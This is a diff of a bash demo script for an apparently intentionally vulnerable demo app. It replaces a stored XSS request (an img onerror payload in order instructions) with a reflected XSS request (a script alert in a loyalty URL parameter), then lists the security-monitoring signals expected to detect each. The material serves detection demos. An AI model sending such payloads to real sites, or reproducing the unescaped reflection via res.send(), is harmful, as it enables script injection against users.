@@ -1,27 +1,19 @@
 #!/usr/bin/env bash
-# Demo: Stored XSS via order special instructions
+# Demo: Reflected XSS via loyalty card customer parameter
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 source "$SCRIPT_DIR/_common.sh"
 
-banner "Stored XSS" \
-       "corndog-web-ui (Angular) + corndog-orders (Flask)" \
-       "IAST Vulnerability Detection"
+banner "Reflected XSS" \
+       "corndog-loyalty (Express / Node.js)" \
+       "ASM Threat Detection + Static Analysis"
 
-run_curl "Placing order with XSS payload in specialInstructions" \
-  -X POST "${BASE_URL}/api/orders" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "customerName": "XSS Demo",
-    "items": [{"menu_item_id": 1, "quantity": 1}],
-    "specialInstructions": "<img src=x onerror=alert('"'"'XSS'"'"')>",
-    "totalPrice": 4.99
-  }'
+run_curl "Requesting loyalty card with XSS payload in customer parameter" \
+  "${BASE_URL}/api/loyalty/card?customer=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E"
 
-echo -e "${YLW}  Tip: Open the order confirmation or admin panel in a browser${RST}"
-echo -e "${YLW}  to see the XSS payload render.${RST}"
+echo -e "${YLW}  Tip: Open the URL in a browser to see the reflected XSS payload render.${RST}"
 echo ""
 
 dd_signal \
-  "Security > Application Security > Vulnerabilities — IAST XSS finding" \
-  "RUM > Sessions — browser error from onerror handler" \
-  "Admin panel or confirmation page renders the injected <img> tag"
+  "Security > Application Security > Signals — ASM XSS threat event" \
+  "Security > Code Security > Static Analysis — typescript-express/xss-vulnerability" \
+  "The customer parameter is reflected directly into HTML via res.send()"
